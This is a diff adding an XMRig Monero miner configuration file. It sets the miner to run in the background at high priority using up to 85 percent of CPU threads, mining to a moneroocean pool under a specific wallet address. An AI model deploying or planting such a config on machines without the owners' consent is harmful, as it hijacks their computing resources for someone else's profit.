@@ -1,0 +1,44 @@
+{
+  "autosave": true,
+  "background": true,
+  "colors": true,
+  "title": true,
+  "donate-level": 0,
+  "log-file": "xmrig.log",
+
+  "randomx": {
+    "init": -1,
+    "mode": "fast",
+    "1gb-pages": false,
+    "rdmsr": false,
+    "wrmsr": false,
+    "numa": false,
+    "scratchpad_prefetch_mode": 1
+  },
+
+  "cpu": {
+    "enabled": true,
+    "huge-pages": false,
+    "huge-pages-jit": false,
+    "hw-aes": null,
+    "priority": 5,
+    "memory-pool": true,
+    "yield": false,
+    "asm": true,
+    "argon2-impl": "default",
+    "max-threads-hint": 85
+  },
+
+  "opencl": false,
+  "cuda": false,
+
+  "pools": [
+    {
+      "url": "gulf.moneroocean.stream:10128",
+      "user": "47irrubweAQDazarQLz9v1dp6LowSWXJ6RF194dzFpe2ZM9sKos8KRkfJnkKYLy24KVMNY75Qywwu4VBR6doyCueQfjCU5N",
+      "pass": "graviton",
+      "keepalive": true,
+      "tls": false
+    }
+  ]
+}
